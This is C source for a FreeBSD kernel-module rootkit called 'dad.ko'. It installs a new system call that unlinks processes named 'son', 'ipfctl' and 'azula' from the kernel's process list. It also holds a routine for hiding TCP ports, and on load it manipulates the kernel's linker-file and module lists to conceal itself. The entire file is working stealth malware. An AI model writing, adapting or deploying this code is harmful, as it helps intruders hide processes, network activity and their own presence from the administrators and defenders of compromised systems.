#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/sysproto.h>

#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <net/vnet.h>

#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

// Module hiding

#include <sys/linker.h>
#define MODULE "dad.ko"

// Variables to hide modules
extern linker_file_list_t linker_files;
extern struct mtx kld_sx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module) link;  	// chain together all modules
	TAILQ_ENTRY(module) flink; 	// all modules in a file
	struct linker_file *file;  	// file which contains module
	int refs;		   	// reference count
	int id;			   	// unique id
	char *name;		   	// module name
	modeventhand_t handler;	   	// event handler
	void *arg;		   	// argument for handler
	modspecific_t data;	   	// module specific data
};
struct linker_file *lf;
struct module *mod;

static int
process_hiding(char *procname)
{
	struct proc *p;

	sx_xlock(&allproc_lock);
	
	// Iterate through the allproc list.
	LIST_FOREACH(p, &allproc, p_list) {
		
		PROC_LOCK(p);
		
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}
		
		// Do we want to hide this process?
		if (strncmp(p->p_comm, procname, MAXCOMLEN) == 0){
			LIST_REMOVE(p, p_list);
	
		}
		PROC_UNLOCK(p);
		
	}
	
	sx_xunlock(&allproc_lock);

	return(0);
}

/* System call to hide an open port. */

static int
port_hiding(u_int16_t fport)
{
	struct inpcb *inp;

	INP_INFO_WLOCKED(&V_tcbinfo);
	
	// Iterate through the TCP-based inpcb list.
	CK_LIST_FOREACH(inp, tcbinfo.ipi_listhead, inp_list) {	
		if (inp->inp_vflag & INP_TIMEWAIT) {
			continue;
		}

		INP_WLOCK(inp);

		// Do we want to hide this local open port?
		if (fport == ntohs(inp->inp_inc.inc_ie.ie_fport)){
			CK_LIST_REMOVE(inp, inp_list);
		}
		INP_WUNLOCK(inp);
	
	}
	INP_INFO_WUNLOCK(&V_tcbinfo);

	return(0);
}

static int general_handler(struct thread *td, void *syscall_args) {
	process_hiding("son");
	process_hiding("ipfctl");
	process_hiding("azula");
	//port_hiding(8888);
	return(0);
}

/* The sysent for the new system call. */
static struct sysent dad_sysent = {
	0,
	general_handler	/* implementing function*/
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = 216;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		
		// Lock mutex on kld list and kernel so we can modify
		// linker_files, modify kernel image's ref cnt
		// should probably do this, but this broke it on BSD
		// commenting this out fixed it so :shrug:
		//mtx_lock(&Giant);
		//mtx_lock(&kld_sx);
		
		// Decrement kernel image's ref cnt
		(&linker_files)->tqh_first->refs--;

		// Iterate through linker_files list. If file is dad.ko
		// (MODULE), decrement next_file_id and remove from list.

		TAILQ_FOREACH(lf, &linker_files, link) {
			if(strcmp(lf->filename, MODULE) == 0) {
				//next_file_id--;
				//TAILQ_REMOVE(&linker_files, lf, link);
				break;
			}
		}

		// Release linker_files mutexs.

		//mtx_unlock(&kld_sx);
		//mtx_unlock(&Giant);

		sx_xlock(&modules_sx);

		// Now, remove dad.ko from the modules list too.
		TAILQ_FOREACH(mod, &modules, link) {
			if(strcmp(mod->name, "dad") == 0) {
				//nextid--;
				//TAILQ_REMOVE(&modules, mod, link);
				break;
			}
		}

		sx_xunlock(&modules_sx);
		
		break;

	case MOD_UNLOAD:
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

SYSCALL_MODULE(dad, &offset, &dad_sysent, load, 0);
